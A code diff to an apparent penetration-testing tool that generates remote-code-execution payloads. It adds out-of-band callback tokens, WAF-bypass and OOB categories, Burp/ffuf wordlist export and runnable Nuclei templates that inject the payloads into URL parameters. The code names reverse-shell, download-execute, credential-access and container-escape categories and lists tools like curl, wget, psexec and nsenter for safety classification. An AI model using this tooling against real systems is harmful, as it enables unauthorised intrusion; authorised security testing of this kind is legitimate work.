@@ -43,6 +43,8 @@ class PayloadRecord:
     notes: Tuple[str, ...] = ()
     blocking: bool = False
     stateful: bool = False
+    token: Optional[str] = None
+    oob_host: Optional[str] = None
 
 class RCEPayloadGenerator:
     def __init__(
@@ -236,6 +238,8 @@ class RCEPayloadGenerator:
             "database_enumeration": "Expect schema names, database inventory, or permission errors that confirm DB reachability.",
             "lateral_movement": "Expect an authorized remote-management event, connection attempt, or access-denied telemetry.",
             "container_escape": "Expect evidence of host boundary visibility, namespace access, or orchestrator privilege exposure.",
+            "oob": "Expect an out-of-band DNS/HTTP callback to your collaborator/interactsh listener carrying the payload's unique token.",
+            "waf_bypass": "Expect the same command output as the plain variant, proving the quote/space-free form slipped past input filtering.",
         }
         return category_indicators.get(category_name, f"Expect a controlled {env} execution observable in the response or logs.")
 
@@ -271,9 +275,11 @@ class RCEPayloadGenerator:
             return "intrusive"
         if any(token in lower_payload for token in ["curl ", "wget ", "invoke-webrequest", "invoke-restmethod", "ssh ", "scp ", "winrs ", "psexec", "kubectl ", "docker run", "nsenter", "tcpclient", "fsockopen"]):
             return "intrusive"
+        if "{oob}" in payload or "jndi:" in lower_payload:
+            return "intrusive"
         if mode == "detection":
             return "safe"
-        if category_name in {"reverse_shells", "download_execute", "credential_access", "container_escape", "lateral_movement"}:
+        if category_name in {"reverse_shells", "download_execute", "credential_access", "container_escape", "lateral_movement", "oob"}:
             return "intrusive"
         return "safe"
 
@@ -338,6 +344,7 @@ class RCEPayloadGenerator:
         watermark_token: Optional[str] = None,
         max_safety: str = "intrusive",
         include_blocking: bool = False,
+        oob_domain: Optional[str] = None,
     ) -> Iterator[PayloadRecord]:
         generated_payloads: Set[str] = set()
         contexts = selected_contexts if selected_contexts else list(self.contexts.keys())
@@ -354,7 +361,11 @@ class RCEPayloadGenerator:
                 for env in environments:
                     for entry in self.detection_payloads.get(env, []):
                         base = self._normalize_entry(entry)
-                        payload = str(base["payload"]).replace("{attacker_ip}", self.attacker_ip).replace("{canary}", self._generate_canary())
+                        # {canary}/{oob} stay as placeholders here and are given a
+                        # fresh per-record correlation token in _encode_record_variants.
+                        payload = str(base["payload"]).replace("{attacker_ip}", self.attacker_ip)
+                        if "{oob}" in payload and not oob_domain:
+                            continue
                         runner = base.get("runner") or self._infer_runner(payload, env, None)
                         blocking = bool(base.get("blocking", self._is_blocking(payload)))
                         safety = base.get("safety") or self._classify_safety(payload, "detection", "detection")
@@ -380,6 +391,7 @@ class RCEPayloadGenerator:
                             notes=tuple([*base.get("notes", ()), *self._lint_payload(payload, env)]),
                             blocking=blocking,
                             stateful=bool(base.get("stateful", self._is_stateful(payload))),
+                            oob_domain=oob_domain,
                         )
             return
 
@@ -427,6 +439,7 @@ class RCEPayloadGenerator:
                                     watermark_token=watermark_token,
                                     max_safety=max_safety,
                                     include_blocking=include_blocking,
+                                    oob_domain=oob_domain,
                                 )
                     else:
                         for entry in env_payloads:
@@ -442,6 +455,7 @@ class RCEPayloadGenerator:
                                 watermark_token=watermark_token,
                                 max_safety=max_safety,
                                 include_blocking=include_blocking,
+                                oob_domain=oob_domain,
                             )
 
     def _build_record_set(
@@ -457,9 +471,13 @@ class RCEPayloadGenerator:
         watermark_token: Optional[str],
         max_safety: str,
         include_blocking: bool,
+        oob_domain: Optional[str] = None,
     ) -> Iterator[PayloadRecord]:
         base = self._normalize_entry(entry)
         payload = str(base["payload"]).replace("{attacker_ip}", self.attacker_ip).replace("{attacker_domain}", self.attacker_domain)
+        # OOB payloads only make sense with a collaborator domain to call back to.
+        if "{oob}" in payload and not oob_domain:
+            return
         runner = base.get("runner") or self._infer_runner(payload, env, sink)
         blocking = bool(base.get("blocking", self._is_blocking(payload)))
         safety = base.get("safety") or self._classify_safety(payload, category_name, mode)
@@ -495,6 +513,7 @@ class RCEPayloadGenerator:
                 notes=notes,
                 blocking=blocking,
                 stateful=bool(base.get("stateful", self._is_stateful(payload))),
+                oob_domain=oob_domain,
             )
 
     def _encode_record_variants(
@@ -515,13 +534,31 @@ class RCEPayloadGenerator:
         notes: Tuple[str, ...],
         blocking: bool,
         stateful: bool,
+        oob_domain: Optional[str] = None,
     ) -> Iterator[PayloadRecord]:
         context = self.contexts[context_name]
         for enc_name in encodings:
             if enc_name not in self.encoding_methods or not self._encoding_is_compatible(enc_name, runner):
                 continue
             try:
-                encoded_payload = self.encoding_methods[enc_name](payload)
+                # Give each emitted variant its own correlation token so a received
+                # callback or reflected canary maps back to exactly one payload.
+                working = payload
+                token: Optional[str] = None
+                oob_host: Optional[str] = None
+                exp_channel = expected_channel
+                ind = indicator
+                if "{oob}" in working and oob_domain:
+                    token = self._generate_oob_token()
+                    oob_host = f"{token}.{oob_domain}"
+                    working = working.replace("{oob}", oob_host)
+                    exp_channel = "interactsh"
+                    ind = f"Look for an out-of-band DNS/HTTP callback to {oob_host} in your OOB listener."
+                elif "{canary}" in working:
+                    token = self._generate_canary()
+                    working = working.replace("{canary}", token)
+
+                encoded_payload = self.encoding_methods[enc_name](working)
                 wrapped_payload = f"{context['prefix']}{encoded_payload}{context['suffix']}"
                 if wrapped_payload in generated_payloads:
                     continue
@@ -539,17 +576,22 @@ class RCEPayloadGenerator:
                     context=context_name,
                     encoding=enc_name,
                     sink=sink,
-                    indicator=indicator,
+                    indicator=ind,
                     safety=safety if safety in SAFETY_ORDER else "intrusive",
-                    expected_channel=expected_channel,
+                    expected_channel=exp_channel,
                     runner=runner,
                     tags=tags,
                     notes=tuple(dict.fromkeys(final_notes)),
                     blocking=blocking,
                     stateful=stateful,
+                    token=token,
+                    oob_host=oob_host,
                 )
             except Exception as exc:
                 logger.error("Error encoding payload with %s: %s", enc_name, exc)
+
+    def _generate_oob_token(self) -> str:
+        return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(12))
 
     def _generate_canary(self) -> str:
         return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
@@ -563,24 +605,32 @@ class RCEPayloadGenerator:
         **kwargs,
     ) -> int:
         """
-        Generate payloads and save them to a file
+        Generate payloads and write them in the requested output format.
 
-        Args:
-            file_path: Path to the output file
-            max_payloads: Maximum number of payloads to generate (None for unlimited)
-            **kwargs: Arguments to pass to generate_payloads
-            
-        Returns:
-            Number of payloads generated
+        Formats: ``text`` / ``jsonl`` (single file, plus a ``.meta.jsonl`` and,
+        when correlation tokens are present, a ``.map.jsonl`` sidecar),
+        ``burp`` (per-context wordlists + request template for Burp/ffuf), and
+        ``nuclei`` (runnable Nuclei templates keyed to the payloads' oracle).
+
+        Returns the number of payloads written.
         """
-        count = 0
         output_path = Path(file_path)
+        records = self.generate_payload_records(**kwargs)
+
+        if output_format == "burp":
+            return self._write_burp(output_path, records, max_payloads)
+        if output_format == "nuclei":
+            return self._write_nuclei(output_path, records, max_payloads)
+
+        count = 0
+        manifest: List[Dict[str, Any]] = []
         metadata_path = output_path.with_suffix(f"{output_path.suffix}.meta.jsonl")
+        map_path = output_path.with_suffix(f"{output_path.suffix}.map.jsonl")
         try:
             with output_path.open("w", encoding="utf-8") as file:
                 metadata_file = metadata_path.open("w", encoding="utf-8") if include_metadata and output_format == "text" else None
                 try:
-                    for record in self.generate_payload_records(**kwargs):
+                    for record in records:
                         serialized = json.dumps(asdict(record), ensure_ascii=True)
                         if output_format == "jsonl":
                             file.write(serialized + "\n")
@@ -588,6 +638,19 @@ class RCEPayloadGenerator:
                             file.write(record.payload + "\n")
                             if metadata_file:
                                 metadata_file.write(serialized + "\n")
+                        if record.token:
+                            manifest.append({
+                                "token": record.token,
+                                "oob_host": record.oob_host,
+                                "payload": record.payload,
+                                "category": record.category,
+                                "environment": record.environment,
+                                "context": record.context,
+                                "sink": record.sink,
+                                "encoding": record.encoding,
+                                "expected_channel": record.expected_channel,
+                                "indicator": record.indicator,
+                            })
                         count += 1
                         if max_payloads and count >= max_payloads:
                             break
@@ -595,13 +658,171 @@ class RCEPayloadGenerator:
                     if metadata_file:
                         metadata_file.close()
 
+            if manifest:
+                with map_path.open("w", encoding="utf-8") as map_file:
+                    for entry in manifest:
+                        map_file.write(json.dumps(entry, ensure_ascii=True) + "\n")
+
             logger.info("Successfully generated %s payloads to %s", count, output_path)
             if include_metadata and output_format == "text":
                 logger.info("Metadata sidecar written to %s", metadata_path)
+            if manifest:
+                logger.info("Correlation map (token -> payload) written to %s", map_path)
         except Exception as e:
             logger.error(f"Error writing to file {output_path}: {e}")
 
         return count
+
+    def _format_outdir(self, output_path: Path, suffix: str) -> Path:
+        """Derive an output directory name for multi-file formats."""
+        return output_path.with_name(f"{output_path.stem or 'rce_payloads'}_{suffix}")
+
+    def _write_burp(self, output_path: Path, records: Iterator[PayloadRecord], max_payloads: Optional[int]) -> int:
+        """Write deduplicated, watermark-free payload wordlists grouped by injection context."""
+        outdir = self._format_outdir(output_path, "burp")
+        outdir.mkdir(parents=True, exist_ok=True)
+        groups: "Dict[str, List[str]]" = {}
+        seen: Set[str] = set()
+        count = 0
+        for record in records:
+            # Emit the unencoded payloads; Burp/ffuf apply their own encoding.
+            if record.encoding != "none":
+                continue
+            if record.payload in seen:
+                continue
+            seen.add(record.payload)
+            groups.setdefault(record.context, []).append(record.payload)
+            count += 1
+            if max_payloads and count >= max_payloads:
+                break
+        try:
+            for context_name, items in groups.items():
+                (outdir / f"payloads-{context_name}.txt").write_text("\n".join(items) + "\n", encoding="utf-8")
+            all_items = [p for items in groups.values() for p in items]
+            (outdir / "payloads-all.txt").write_text("\n".join(all_items) + "\n", encoding="utf-8")
+            (outdir / "request.txt").write_text(self._burp_request_template(), encoding="utf-8")
+            logger.info("Burp/ffuf wordlists written to %s/ (%s payloads across %s context files)", outdir, count, len(groups))
+        except Exception as exc:
+            logger.error("Error writing Burp output to %s: %s", outdir, exc)
+        return count
+
+    def _burp_request_template(self) -> str:
+        return (
+            "# Burp Intruder: load payloads-*.txt as a payload set; the injection\n"
+            "# point is marked with Burp's position markers (the caret pair below).\n"
+            "# ffuf: replace the marked value with the keyword FUZZ and use\n"
+            "#   ffuf -request request.txt -w payloads-all.txt:FUZZ\n"
+            "POST /vulnerable-endpoint HTTP/1.1\n"
+            "Host: TARGET-HOST\n"
+            "User-Agent: rcpayloadgen\n"
+            "Content-Type: application/x-www-form-urlencoded\n"
+            "Connection: close\n"
+            "\n"
+            "vulnerable_param=\xa7INJECT\xa7\n"
+        )
+
+    def _write_nuclei(self, output_path: Path, records: Iterator[PayloadRecord], max_payloads: Optional[int]) -> int:
+        """Emit Nuclei templates grouped by environment and oracle (OOB / time-based / reflection)."""
+        import re
+
+        outdir = self._format_outdir(output_path, "nuclei")
+        outdir.mkdir(parents=True, exist_ok=True)
+        canary = "RCEPGCANARY"
+        groups: "Dict[Tuple[str, str], List[str]]" = {}
+        seen: "Dict[Tuple[str, str], Set[str]]" = {}
+        sleep_tokens = ("sleep", "timeout", "start-sleep", "pg_sleep", "thread.sleep", "time.sleep")
+        count = 0
+        for record in records:
+            # Nuclei url-encodes the payload itself, so only the unencoded form
+            # is meaningful (and encoded blobs would hide the OOB host). Inject
+            # into a generic URL parameter, so only the raw context applies.
+            if record.encoding != "none" or record.context != "raw":
+                continue
+            payload = record.payload
+            lower = payload.lower()
+            if record.oob_host:
+                payload = payload.replace(record.oob_host, "{{interactsh-url}}")
+                oracle = "oob"
+            elif any(t in lower for t in sleep_tokens) and "tail" not in lower:
+                # Only bounded sleeps give a reliable duration matcher; normalise
+                # every delay to 6 seconds so "duration>=6" is meaningful.
+                payload = re.sub(r"(?i)(sleep\s+)\d+", r"\g<1>6", payload)
+                payload = re.sub(r"(?i)(-seconds\s+)\d+", r"\g<1>6", payload)
+                payload = re.sub(r"(?i)(/t\s+)\d+", r"\g<1>6", payload)
+                payload = re.sub(r"(?i)(pg_sleep\()\d+", r"\g<1>6", payload)
+                oracle = "time"
+            elif record.token and record.mode == "detection":
+                payload = payload.replace(record.token, canary)
+                oracle = "reflect"
+            else:
+                continue
+            key = (record.environment, oracle)
+            bucket = seen.setdefault(key, set())
+            if payload in bucket:
+                continue
+            bucket.add(payload)
+            groups.setdefault(key, []).append(payload)
+            count += 1
+            if max_payloads and count >= max_payloads:
+                break
+        try:
+            for (env, oracle), payloads in groups.items():
+                template = self._nuclei_template(env, oracle, payloads, canary)
+                (outdir / f"rcpg-{env}-{oracle}.yaml").write_text(template, encoding="utf-8")
+            logger.info("Nuclei templates written to %s/ (%s templates, %s payloads)", outdir, len(groups), count)
+        except Exception as exc:
+            logger.error("Error writing Nuclei output to %s: %s", outdir, exc)
+        return count
+
+    def _nuclei_template(self, env: str, oracle: str, payloads: List[str], canary: str) -> str:
+        plist = "\n".join(f"          - {json.dumps(p)}" for p in payloads)
+        if oracle == "oob":
+            name = f"Out-of-band RCE probe ({env})"
+            matcher = (
+                "    matchers:\n"
+                "      - type: word\n"
+                "        part: interactsh_protocol\n"
+                "        words:\n"
+                "          - \"dns\"\n"
+                "          - \"http\""
+            )
+        elif oracle == "time":
+            name = f"Time-based blind RCE probe ({env})"
+            matcher = (
+                "    matchers:\n"
+                "      - type: dsl\n"
+                "        dsl:\n"
+                "          - \"duration>=6\""
+            )
+        else:
+            name = f"Reflected RCE probe ({env})"
+            matcher = (
+                "    matchers:\n"
+                "      - type: word\n"
+                "        part: body\n"
+                "        words:\n"
+                f"          - \"{canary}\""
+            )
+        return (
+            f"id: rcpg-{env}-{oracle}\n\n"
+            "info:\n"
+            f"  name: {name}\n"
+            "  author: rcpayloadgen\n"
+            "  severity: high\n"
+            f"  description: Injects {env} RCE payloads into a URL parameter and confirms execution via the {oracle} oracle.\n"
+            f"  tags: rce,rcpayloadgen,{env},{oracle}\n\n"
+            "http:\n"
+            "  - raw:\n"
+            "      - |\n"
+            "        GET /?rcpg={{url_encode(payload)}} HTTP/1.1\n"
+            "        Host: {{Hostname}}\n\n"
+            "    payloads:\n"
+            "      payload:\n"
+            f"{plist}\n"
+            "    attack: batteringram\n"
+            "    stop-at-first-match: true\n\n"
+            f"{matcher}\n"
+        )
 
     def log_exploitation_usage(self, watermark_token: str, arguments: argparse.Namespace) -> None:
         audit_path = Path("exploit_audit.log")
@@ -636,8 +857,10 @@ def main():
                         help="Path to a custom payload template file (JSON or YAML)")
     parser.add_argument("--detection-only", action="store_true",
                         help="Generate benign payloads for detection and validation")
-    parser.add_argument("--output-format", choices=["text", "jsonl"], default="text",
-                        help="Output payloads as plain text or JSONL records")
+    parser.add_argument("--output-format", choices=["text", "jsonl", "burp", "nuclei"], default="text",
+                        help="text/jsonl single file, burp (per-context wordlists + request template), or nuclei (runnable templates)")
+    parser.add_argument("--oob-domain", default=None,
+                        help="Collaborator/interactsh domain for out-of-band payloads; each payload gets a unique subdomain token")
     parser.add_argument("--include-metadata", action="store_true",
                         help="Write indicator and safety metadata alongside payload output")
     parser.add_argument("--max-safety", choices=["safe", "intrusive", "stateful"], default=None,
@@ -676,6 +899,17 @@ def main():
             watermark_token = audit_token
 
     max_safety = args.max_safety or ("safe" if mode == "detection" else "intrusive")
+    include_blocking = args.include_blocking
+    oob_domain = args.oob_domain
+    if args.output_format == "nuclei":
+        # Nuclei templates rely on the time-based, OOB, and reflection oracles,
+        # so pull in blocking/intrusive payloads and provide a placeholder OOB
+        # host that the exporter rewrites to {{interactsh-url}}.
+        include_blocking = True
+        max_safety = "intrusive"
+        if not oob_domain:
+            oob_domain = "oob.interact.sh"
+
     count = generator.save_payloads_to_file(
         file_path=args.output,
         max_payloads=args.max_payloads,
@@ -688,7 +922,8 @@ def main():
         mode=mode,
         watermark_token=watermark_token,
         max_safety=max_safety,
-        include_blocking=args.include_blocking,
+        include_blocking=include_blocking,
+        oob_domain=oob_domain,
     )
 
     print(f"Generated {count} payloads to {args.output} in {mode} mode")
